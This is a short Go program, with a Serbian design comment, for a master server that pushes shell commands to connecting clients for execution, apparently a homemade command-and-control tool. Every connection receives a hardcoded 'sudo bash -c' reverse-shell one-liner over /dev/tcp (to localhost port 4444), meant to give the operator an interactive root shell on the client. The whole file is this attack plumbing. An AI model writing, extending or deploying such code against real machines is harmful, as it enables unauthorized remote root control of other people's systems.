/*
klijenti se povezuju na master server
server salje komandu klijentu
klijent izvrsava komandu i salje output serveru
transfer fajlova isto da moze
al to moze preko ssh-a da se realizuje
klijent izvrsava samo obicne komande
*/

package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
)

func main() {
	fmt.Println("starting tcp server")
	ln, err := net.Listen("tcp", ":9001")
	if err != nil {
		log.Fatalf("error starting listener %v", err)
	}

	for {
		conn, err := ln.Accept()
		fmt.Println("client connected")
		if err != nil {
			log.Printf("error getting conn %v", err)
			continue
		}

		go handleConn(conn)
	}
}

func handleConn(conn net.Conn) {
	args := []string{"sudo", "bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}

	// Write the number of strings
	numStrings := int32(len(args))
	if err := binary.Write(conn, binary.LittleEndian, numStrings); err != nil {
		log.Printf("error writing number of strings: %v", err)
		conn.Close()
		return
	}

	// Write each string with its length
	for _, arg := range args {
		argBytes := []byte(arg)
		argLen := int32(len(argBytes))

		// Write the length of the string
		if err := binary.Write(conn, binary.LittleEndian, argLen); err != nil {
			log.Printf("error writing string length: %v", err)
			conn.Close()
			return
		}

		// Write the string itself
		if err := binary.Write(conn, binary.LittleEndian, argBytes); err != nil {
			log.Printf("error writing string: %v", err)
			conn.Close()
			return
		}
	}

	fmt.Println("client disconnected")
	conn.Close()
}
